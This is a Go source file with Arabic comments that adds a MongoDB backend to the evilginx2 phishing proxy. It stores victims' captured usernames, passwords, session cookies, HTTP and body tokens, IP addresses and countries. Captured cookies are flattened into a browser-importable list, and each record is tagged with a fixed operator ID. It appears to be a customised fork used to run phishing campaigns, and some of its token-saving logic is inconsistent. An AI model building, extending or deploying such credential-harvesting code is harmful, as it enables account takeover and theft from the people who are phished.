package database

import (
	"context"
	"fmt"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/log"
	
	"go.mongodb.org/mongo-driver/bson"
	"go.mongodb.org/mongo-driver/bson/primitive"
	"go.mongodb.org/mongo-driver/mongo"
	"go.mongodb.org/mongo-driver/mongo/options"
)

// MongoDatabase هو نسخة من قاعدة البيانات تستخدم MongoDB
type MongoDatabase struct {
	client       *mongo.Client
	db           *mongo.Database
	sessionsColl *mongo.Collection
	ctx          context.Context
	cancel       context.CancelFunc
}

// Session مع تعديلات لدعم MongoDB
type MongoSession struct {
	ID           primitive.ObjectID                 `bson:"_id,omitempty" json:"_id,omitempty"`
	Id           int                                `bson:"id" json:"id"`
	Phishlet     string                             `bson:"phishlet" json:"phishlet"`
	LandingURL   string                             `bson:"landing_url" json:"landing_url"`
	Username     string                             `bson:"username" json:"username"`
	Password     string                             `bson:"password" json:"password"`
	Custom       map[string]string                  `bson:"custom" json:"custom"`
	BodyTokens   map[string]string                  `bson:"body_tokens" json:"body_tokens"`
	HttpTokens   map[string]string                  `bson:"http_tokens" json:"http_tokens"`
	CookieTokens map[string][]map[string]interface{} `bson:"cookie_tokens" json:"tokens"`
	SessionId    string                             `bson:"session_id" json:"session_id"`
	UserAgent    string                             `bson:"useragent" json:"useragent"`
	RemoteAddr   string                             `bson:"remote_addr" json:"remote_addr"`
	CreateTime   int64                              `bson:"create_time" json:"create_time"`
	UpdateTime   int64                              `bson:"update_time" json:"update_time"`
	UserId       string                             `bson:"user_id" json:"user_id"`
	CountryCode  string                             `bson:"country_code" json:"country_code"`
	Country      string                             `bson:"country" json:"country"`
}

// NewMongoDatabase ينشئ اتصالًا جديدًا بقاعدة بيانات MongoDB
func NewMongoDatabase(mongoURI string, dbName string) (*MongoDatabase, error) {
	log.Info("محاولة الاتصال بـ MongoDB على: %s (قاعدة البيانات: %s)", mongoURI, dbName)

	// سيستمر العملية إذا فشل الاتصال (10 ثوان)
	ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
	
	// إنشاء خيارات العميل
	clientOptions := options.Client().
		ApplyURI(mongoURI).
		SetServerSelectionTimeout(15 * time.Second).
		SetConnectTimeout(15 * time.Second).
		SetSocketTimeout(15 * time.Second).
		SetRetryWrites(true).
		SetRetryReads(true).
		SetDirect(false)
	
	// محاولة الاتصال
	log.Debug("[MongoDB] بدء الاتصال...")
	client, err := mongo.Connect(ctx, clientOptions)
	if err != nil {
		cancel()
		return nil, fmt.Errorf("فشل الاتصال بـ MongoDB: %v", err)
	}

	// التحقق من الاتصال
	log.Debug("[MongoDB] اختبار الاتصال...")
	pingCtx, cancelPing := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancelPing()
	
	if err := client.Ping(pingCtx, nil); err != nil {
		cancel()
		client.Disconnect(ctx)
		return nil, fmt.Errorf("فشل اختبار اتصال MongoDB: %v", err)
	}
	log.Info("تم الاتصال بـ MongoDB بنجاح!")

	db := client.Database(dbName)
	sessionsColl := db.Collection("sessions")
	
	// إنشاء فهرس على حقل SessionId للبحث السريع
	log.Debug("[MongoDB] إنشاء فهرس على حقل SessionId...")
	_, err = sessionsColl.Indexes().CreateOne(ctx, mongo.IndexModel{
		Keys:    bson.D{{Key: "session_id", Value: 1}},
		Options: options.Index().SetUnique(true),
	})
	if err != nil {
		cancel()
		client.Disconnect(ctx)
		return nil, fmt.Errorf("فشل إنشاء الفهرس: %v", err)
	}
	log.Debug("[MongoDB] تم إنشاء الفهرس بنجاح")
	
	// عد عدد الجلسات الموجود
	// إنشاء سياق جديد بدون مهلة للاستخدام في العمليات اللاحقة
	background := context.Background()

	return &MongoDatabase{
		client:       client,
		db:           db,
		sessionsColl: sessionsColl,
		ctx:          background,
		cancel:       cancel,
	}, nil
}

// Close يغلق اتصال قاعدة البيانات
func (m *MongoDatabase) Close() error {
	defer m.cancel()
	return m.client.Disconnect(m.ctx)
}

// Helper: Combine all tokens into a single slice for MongoDB
func combineAllTokens(s *Session) []map[string]interface{} {
	var allTokens []map[string]interface{}
	// Add cookies
	for domain, tokens := range s.CookieTokens {
		for _, token := range tokens {
			allTokens = append(allTokens, map[string]interface{}{
				"name":   token.Name,
				"value":  token.Value,
				"domain": domain,
				"path":   token.Path,
				"expirationDate": token.ExpirationDate,
				"httpOnly":       token.HttpOnly,
				"hostOnly":       !strings.HasPrefix(domain, "."),
				"secure":         false,
				"session":        false,
			})
		}
	}
	// Add body tokens
	for k, v := range s.BodyTokens {
		allTokens = append(allTokens, map[string]interface{}{
			"name":   k,
			"value":  v,
			"domain": "",
			"path":   "",
			"expirationDate": 0,
			"httpOnly":       false,
			"hostOnly":       false,
			"secure":         false,
			"session":        false,
		})
	}
	// Add http tokens
	for k, v := range s.HttpTokens {
		allTokens = append(allTokens, map[string]interface{}{
			"name":   k,
			"value":  v,
			"domain": "",
			"path":   "",
			"expirationDate": 0,
			"httpOnly":       false,
			"hostOnly":       false,
			"secure":         false,
			"session":        false,
		})
	}
	return allTokens
}

// convertToMongoSession: store all tokens in a single list
func convertToMongoSession(s *Session) *MongoSession {
	log.Debug("[MongoDB] تحويل Session إلى MongoSession:")
	log.Debug("[MongoDB] - Session.CountryCode: '%s'", s.CountryCode)
	log.Debug("[MongoDB] - Session.Country: '%s'", s.Country)

	allTokens := combineAllTokens(s)

	mongoSession := &MongoSession{
		Id:           s.Id,
		Phishlet:     s.Phishlet,
		LandingURL:   s.LandingURL,
		Username:     s.Username,
		Password:     s.Password,
		Custom:       s.Custom,
		BodyTokens:   nil, // not needed, all in cookie_tokens
		HttpTokens:   nil, // not needed, all in cookie_tokens
		CookieTokens: map[string][]map[string]interface{}{ "all": allTokens },
		SessionId:    s.SessionId,
		UserAgent:    s.UserAgent,
		RemoteAddr:   s.RemoteAddr,
		CreateTime:   s.CreateTime,
		UpdateTime:   s.UpdateTime,
		UserId:       s.UserId,
		CountryCode:  s.CountryCode,
		Country:      s.Country,
	}
	log.Debug("[MongoDB] بعد التحويل:")
	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", mongoSession.CountryCode)
	log.Debug("[MongoDB] - MongoSession.Country: '%s'", mongoSession.Country)
	return mongoSession
}

// convertFromMongoSession: load all tokens from the single list
func convertFromMongoSession(ms *MongoSession) *Session {
	log.Debug("[MongoDB] تحويل MongoSession إلى Session:")
	log.Debug("[MongoDB] - MongoSession.CountryCode: '%s'", ms.CountryCode)
	log.Debug("[MongoDB] - MongoSession.Country: '%s'", ms.Country)

	cookieTokens := make(map[string]map[string]*CookieToken)
	bodyTokens := make(map[string]string)
	httpTokens := make(map[string]string)
	if all, ok := ms.CookieTokens["all"]; ok {
		for _, token := range all {
			name := getStringValue(token["name"])
			value := getStringValue(token["value"])
			domain := getStringValue(token["domain"])
			path := getStringValue(token["path"])
			httpOnly := getBoolValue(token["httpOnly"])
			expirationDate := int64(0)
			if ed, ok := token["expirationDate"]; ok {
				switch v := ed.(type) {
				case int64:
					expirationDate = v
				case int32:
					expirationDate = int64(v)
				case float64:
					expirationDate = int64(v)
				case float32:
					expirationDate = int64(v)
				case string:
					if parsed, err := strconv.ParseInt(v, 10, 64); err == nil {
						expirationDate = parsed
					}
				}
			}
			if domain != "" {
				if _, ok := cookieTokens[domain]; !ok {
					cookieTokens[domain] = make(map[string]*CookieToken)
				}
				cookieTokens[domain][name] = &CookieToken{
					Name:           name,
					Value:          value,
					Path:           path,
					HttpOnly:       httpOnly,
					ExpirationDate: expirationDate,
				}
			} else {
				// If no domain, treat as body or http token
				bodyTokens[name] = value
				httpTokens[name] = value
			}
		}
	}

	session := &Session{
		Id:           ms.Id,
		Phishlet:     ms.Phishlet,
		LandingURL:   ms.LandingURL,
		Username:     ms.Username,
		Password:     ms.Password,
		Custom:       ms.Custom,
		BodyTokens:   bodyTokens,
		HttpTokens:   httpTokens,
		CookieTokens: cookieTokens,
		SessionId:    ms.SessionId,
		UserAgent:    ms.UserAgent,
		RemoteAddr:   ms.RemoteAddr,
		CreateTime:   ms.CreateTime,
		UpdateTime:   ms.UpdateTime,
		UserId:       ms.UserId,
		CountryCode:  ms.CountryCode,
		Country:      ms.Country,
	}
	log.Debug("[MongoDB] بعد التحويل:")
	log.Debug("[MongoDB] - Session.CountryCode: '%s'", session.CountryCode)
	log.Debug("[MongoDB] - Session.Country: '%s'", session.Country)
	if session.Custom == nil {
		session.Custom = make(map[string]string)
	}
	if ms.CountryCode != "" {
		session.Custom["country_code_backup"] = ms.CountryCode
	}
	if ms.Country != "" {
		session.Custom["country_backup"] = ms.Country
	}
	return session
}

// getStringValue يستخرج قيمة نصية من interface{}
func getStringValue(v interface{}) string {
	if v == nil {
		return ""
	}
	if s, ok := v.(string); ok {
		return s
	}
	return fmt.Sprintf("%v", v)
}

// getBoolValue يستخرج قيمة منطقية من interface{}
func getBoolValue(v interface{}) bool {
	if v == nil {
		return false
	}
	if b, ok := v.(bool); ok {
		return b
	}
	return false
}

// GetLastSessionId يحصل على آخر معرف جلسة
func (m *MongoDatabase) GetLastSessionId() (int, error) {
	opts := options.FindOne().SetSort(bson.D{{Key: "id", Value: -1}})
	var session MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.D{}, opts).Decode(&session)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Debug("[MongoDB] لم يتم العثور على جلسات، سيتم إنشاء أول جلسة بمعرف 1")
			return 0, nil
		}
		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف جلسة: %v", err)
		return 0, err
	}
	log.Debug("[MongoDB] آخر معرف جلسة: %d", session.Id)
	return session.Id, nil
}

// CreateSession ينشئ جلسة جديدة في MongoDB
func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remoteAddr string) error {
	log.Debug("[MongoDB] محاولة إنشاء جلسة جديدة: %s", sid)
	
	// التحقق مما إذا كانت الجلسة موجودة بالفعل
	var existingSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&existingSession)
	if err == nil {
		log.Debug("[MongoDB] الجلسة موجودة بالفعل: %s", sid)
		return fmt.Errorf("الجلسة موجودة بالفعل: %s", sid)
	} else if err != mongo.ErrNoDocuments {
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
		return err
	}

	// الحصول على آخر معرف
	lastId, err := m.GetLastSessionId()
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء الحصول على آخر معرف: %v", err)
		return err
	}
	newId := lastId + 1
	log.Debug("[MongoDB] تعيين معرف الجلسة الجديدة: %d", newId)

	// إنشاء جلسة جديدة
	now := time.Now().UTC().Unix()
	newSession := &MongoSession{
		Id:           newId,
		Phishlet:     phishlet,
		LandingURL:   landingURL,
		Username:     "",
		Password:     "",
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string][]map[string]interface{}),
		SessionId:    sid,
		UserAgent:    useragent,
		RemoteAddr:   remoteAddr,
		CreateTime:   now,
		UpdateTime:   now,
		UserId:       "JEMEX123", // تعيين قيمة UserId الثابتة
		CountryCode:  "",
		Country:      "",
	}

	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء إدراج الجلسة: %v", err)
		return err
	}
	
	log.Debug("[MongoDB] تم إنشاء الجلسة بنجاح: %s (ID: %d)", sid, newId)
	return nil
}

// ListSessions يجلب قائمة الجلسات من MongoDB
func (m *MongoDatabase) ListSessions() ([]*Session, error) {
	log.Debug("[MongoDB] جلب قائمة جميع الجلسات")
	
	cursor, err := m.sessionsColl.Find(m.ctx, bson.M{})
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسات: %v", err)
		return nil, err
	}
	defer cursor.Close(m.ctx)

	var mongoSessions []MongoSession
	if err := cursor.All(m.ctx, &mongoSessions); err != nil {
		log.Error("[MongoDB] خطأ أثناء فك ترميز الجلسات: %v", err)
		return nil, err
	}

	sessions := make([]*Session, 0, len(mongoSessions))
	for i := range mongoSessions {
		sessions = append(sessions, convertFromMongoSession(&mongoSessions[i]))
	}

	return sessions, nil
}

// GetSessionById يجلب جلسة من MongoDB باستخدام المعرف العددي
func (m *MongoDatabase) GetSessionById(id int) (*Session, error) {
	var mongoSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"id": id}).Decode(&mongoSession)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			return nil, fmt.Errorf("الجلسة غير موجودة بالمعرف: %d", id)
		}
		return nil, err
	}

	return convertFromMongoSession(&mongoSession), nil
}

// GetSessionBySid يجلب جلسة من MongoDB باستخدام معرف الجلسة
func (m *MongoDatabase) GetSessionBySid(sid string) (*Session, error) {
	log.Debug("[MongoDB] البحث عن الجلسة بواسطة SID: %s", sid)
	
	// تحقق من البيانات المخزنة فعلياً في MongoDB
	m.ShowSessionDataInMongoDB(sid)
	
	var mongoSession MongoSession
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&mongoSession)
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Debug("[MongoDB] الجلسة غير موجودة: %s", sid)
			return nil, fmt.Errorf("الجلسة غير موجودة: %s", sid)
		}
		log.Error("[MongoDB] خطأ أثناء البحث عن الجلسة: %v", err)
		return nil, err
	}
	
	log.Debug("[MongoDB] تم العثور على الجلسة: %s (ID: %d)", sid, mongoSession.Id)
	
	// عرض وطباعة المعلومات المهمة
	log.Success("[MongoDB] معلومات البلد المستردة من MongoDB: رمز البلد: '%s'، البلد: '%s'", 
		mongoSession.CountryCode, mongoSession.Country)
	
	return convertFromMongoSession(&mongoSession), nil
}

// ShowSessionDataInMongoDB يُظهر البيانات الخام للجلسة من قاعدة البيانات
func (m *MongoDatabase) ShowSessionDataInMongoDB(sid string) {
	log.Debug("[MongoDB] استعراض البيانات الخام للجلسة: %s", sid)
	
	var rawDocument bson.M
	err := m.sessionsColl.FindOne(m.ctx, bson.M{"session_id": sid}).Decode(&rawDocument)
	if err != nil {
		log.Error("[MongoDB] فشل استرداد البيانات الخام: %v", err)
		return
	}
	
	// طباعة الحقول المهمة
	log.Debug("[MongoDB] البيانات الخام من MongoDB:")
	log.Debug("[MongoDB] - _id: %v", rawDocument["_id"])
	log.Debug("[MongoDB] - session_id: %v", rawDocument["session_id"])
	log.Debug("[MongoDB] - id: %v", rawDocument["id"])
	log.Debug("[MongoDB] - country_code: '%v' (نوع: %T)", rawDocument["country_code"], rawDocument["country_code"])
	log.Debug("[MongoDB] - country: '%v' (نوع: %T)", rawDocument["country"], rawDocument["country"])
	
	// البيانات الاختبارية
	log.Debug("[MongoDB] - test_country: '%v'", rawDocument["test_country"])
	log.Debug("[MongoDB] - test_code: '%v'", rawDocument["test_code"])
	log.Debug("[MongoDB] - direct_update: '%v'", rawDocument["direct_update"])
	log.Debug("[MongoDB] - country_code_raw: '%v'", rawDocument["country_code_raw"])
	log.Debug("[MongoDB] - country_raw: '%v'", rawDocument["country_raw"])
	
	// البيانات من الحقول المخصصة
	if customData, ok := rawDocument["custom"].(map[string]interface{}); ok {
		log.Debug("[MongoDB] - custom.country_code_custom: '%v'", customData["country_code_custom"])
		log.Debug("[MongoDB] - custom.country_custom: '%v'", customData["country_custom"])
	}
}

// UpdateSession يحدث جلسة في MongoDB
func (m *MongoDatabase) UpdateSession(s *Session) error {
	mongoSession := convertToMongoSession(s)
	mongoSession.UpdateTime = time.Now().UTC().Unix()

	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"id": s.Id},
		bson.M{"$set": mongoSession},
	)
	return err
}

// UpdateSessionUsername يحدث اسم المستخدم للجلسة
func (m *MongoDatabase) UpdateSessionUsername(sid, username string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"username":    username,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionPassword يحدث كلمة المرور للجلسة
func (m *MongoDatabase) UpdateSessionPassword(sid, password string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"password":    password,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
func (m *MongoDatabase) UpdateSessionCustom(sid, name, value string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				fmt.Sprintf("custom.%s", name): value,
				"update_time":                  now,
			},
		},
	)
	return err
}

// UpdateSessionCookieTokens: save all tokens as a single list
func (m *MongoDatabase) UpdateSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
	log.Debug("[MongoDB] محاولة تحديث كل التوكنز للجلسة: %s", sid)
	allTokens := combineAllTokens(&Session{CookieTokens: tokens, BodyTokens: bodyTokens, HttpTokens: httpTokens})
	now := time.Now().UTC().Unix()
	update := bson.M{
		"$set": bson.M{
			"cookie_tokens": map[string][]map[string]interface{}{ "all": allTokens },
			"update_time":   now,
		},
	}
	result, err := m.sessionsColl.UpdateOne(m.ctx, bson.M{"session_id": sid}, update)
	if err != nil {
		log.Error("[MongoDB] فشل تحديث التوكنز: %v", err)
		return err
	}
	log.Success("[MongoDB] تم تحديث كل التوكنز بنجاح، عدد الوثائق المعدلة: %d", result.ModifiedCount)
	return nil
}

// DeleteSessionById يحذف جلسة باستخدام المعرف العددي
func (m *MongoDatabase) DeleteSessionById(id int) error {
	log.Debug("[MongoDB] محاولة حذف الجلسة بالمعرف العددي: %d", id)
	
	result, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"id": id})
	if err != nil {
		log.Error("[MongoDB] خطأ أثناء حذف الجلسة بالمعرف %d: %v", id, err)
		return err
	}
	
	if result.DeletedCount == 0 {
		return fmt.Errorf("لم يتم العثور على جلسة بالمعرف: %d", id)
	}
	
	log.Debug("[MongoDB] تم حذف الجلسة بالمعرف %d بنجاح", id)
	return nil
}

// DeleteSession يحذف جلسة باستخدام معرف الجلسة (sid)
func (m *MongoDatabase) DeleteSession(sid string) error {
	_, err := m.sessionsColl.DeleteOne(m.ctx, bson.M{"session_id": sid})
	return err
}

// Flush لا يؤثر في MongoDB لكن موجود للتوافق مع الواجهة
func (m *MongoDatabase) Flush() {
	// لا حاجة للتنفيذ في MongoDB
}

// UpdateSessionBodyTokens يحدث رموز الهيكل للجلسة
func (m *MongoDatabase) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"body_tokens": tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionHttpTokens يحدث رموز HTTP للجلسة
func (m *MongoDatabase) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	now := time.Now().UTC().Unix()
	_, err := m.sessionsColl.UpdateOne(
		m.ctx,
		bson.M{"session_id": sid},
		bson.M{
			"$set": bson.M{
				"http_tokens": tokens,
				"update_time": now,
			},
		},
	)
	return err
}

// UpdateSessionUsername يحدث اسم المستخدم للجلسة
func (m *MongoDatabase) SetSessionUsername(sid string, username string) error {
	return m.UpdateSessionUsername(sid, username)
}

// UpdateSessionPassword يحدث كلمة المرور للجلسة
func (m *MongoDatabase) SetSessionPassword(sid string, password string) error {
	return m.UpdateSessionPassword(sid, password)
}

// UpdateSessionCustom يحدث بيانات مخصصة للجلسة
func (m *MongoDatabase) SetSessionCustom(sid string, name, value string) error {
	return m.UpdateSessionCustom(sid, name, value)
}

// SetSessionCookieTokens: update all tokens at once
func (m *MongoDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
	log.Debug("Saving all cookies for session %s", sid)
	
	// Get current session
	session, err := m.GetSessionBySid(sid)
	if err != nil {
		return fmt.Errorf("failed to get session: %v", err)
	}

	// Convert all tokens to a single list
	var allTokens []map[string]interface{}
	
	// Add cookie tokens
	for domain, domainTokens := range tokens {
		for name, token := range domainTokens {
			tokenMap := map[string]interface{}{
				"domain": domain,
				"name":   name,
				"value":  token.Value,
				"path":   token.Path,
				"httpOnly": token.HttpOnly,
				"expiration": token.ExpirationDate,
			}
			allTokens = append(allTokens, tokenMap)
			log.Debug("Added cookie: %s (domain: %s)", name, domain)
		}
	}

	// Add body tokens
	for name, value := range bodyTokens {
		tokenMap := map[string]interface{}{
			"type":  "body",
			"name":  name,
			"value": value,
		}
		allTokens = append(allTokens, tokenMap)
		log.Debug("Added body token: %s", name)
	}

	// Add HTTP tokens
	for name, value := range httpTokens {
		tokenMap := map[string]interface{}{
			"type":  "http",
			"name":  name,
			"value": value,
		}
		allTokens = append(allTokens, tokenMap)
		log.Debug("Added HTTP token: %s", name)
	}

	// Update session with all tokens
	session.CookieTokens = tokens
	session.BodyTokens = bodyTokens
	session.HttpTokens = httpTokens

	// Save to MongoDB
	_, err = m.sessionsColl.ReplaceOne(
		m.ctx,
		bson.M{"session_id": sid},
		session,
	)
	if err != nil {
		return fmt.Errorf("failed to update session: %v", err)
	}

	// Verify the save
	updatedSession, err := m.GetSessionBySid(sid)
	if err != nil {
		return fmt.Errorf("failed to verify save: %v", err)
	}

	log.Debug("Session updated successfully. Total tokens: %d", len(allTokens))
	log.Debug("Cookies in session: %d", len(updatedSession.CookieTokens))
	
	return nil
}

// UpdateSessionCountryInfo يحدث معلومات البلد للجلسة
func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country string) error {
	log.Debug("[MongoDB] محاولة تحديث معلومات البلد للجلسة: %s (رمز البلد: %s، البلد: %s)", sid, countryCode, country)
	
	// استخدام طريقة جديدة: FindOneAndUpdate بدلاً من UpdateOne
	opts := options.FindOneAndUpdate().SetReturnDocument(options.After)
	filter := bson.M{"session_id": sid}
	update := bson.M{
		"$set": bson.M{
			"country_code": countryCode,
			"country": country,
			// استخدام الحقول المخصصة أيضاً للتأكد
			"custom.country_code_backup": countryCode,
			"custom.country_backup": country,
			// حقول اختبار للتأكد من التحديث
			"test_country": "TEST-" + country,
			"test_code": "TEST-" + countryCode,
			"update_method": "findOneAndUpdate",
			"update_time": time.Now().UTC().Unix(),
		},
	}
	
	// محاولة تحديث وإرجاع الوثيقة المحدثة
	var updatedDoc bson.M
	err := m.sessionsColl.FindOneAndUpdate(m.ctx, filter, update, opts).Decode(&updatedDoc)
	
	if err != nil {
		if err == mongo.ErrNoDocuments {
			log.Error("[MongoDB] الجلسة غير موجودة: %s", sid)
			return fmt.Errorf("الجلسة غير موجودة: %s", sid)
		}
		log.Error("[MongoDB] فشل تحديث معلومات البلد باستخدام FindOneAndUpdate: %v", err)
		
		// محاولة بطريقة UpdateSessionCustom كبديل
		log.Warning("[MongoDB] جاري المحاولة بطريقة بديلة...")
		e1 := m.UpdateSessionCustom(sid, "country_code_direct", countryCode)
		e2 := m.UpdateSessionCustom(sid, "country_direct", country)
		
		if e1 != nil || e2 != nil {
			log.Error("[MongoDB] فشل الطريقة البديلة أيضاً: %v, %v", e1, e2)
			return err
		}
		
		log.Success("[MongoDB] تم تحديث معلومات البلد باستخدام الطريقة البديلة")
		return nil
	}
	
	// طباعة البيانات المحدثة للتحقق
	log.Success("[MongoDB] تم تحديث معلومات البلد بنجاح باستخدام FindOneAndUpdate")
	
	// طباعة البيانات المحدثة
	if cc, ok := updatedDoc["country_code"].(string); ok {
		log.Debug("[MongoDB] قيمة country_code بعد التحديث: '%s'", cc)
	}
	
	if c, ok := updatedDoc["country"].(string); ok {
		log.Debug("[MongoDB] قيمة country بعد التحديث: '%s'", c)
	}
	
	// تحقق إضافي: استرداد الجلسة كاملة للتأكد من التحديث
	m.ShowSessionDataInMongoDB(sid)
	
	return nil
} 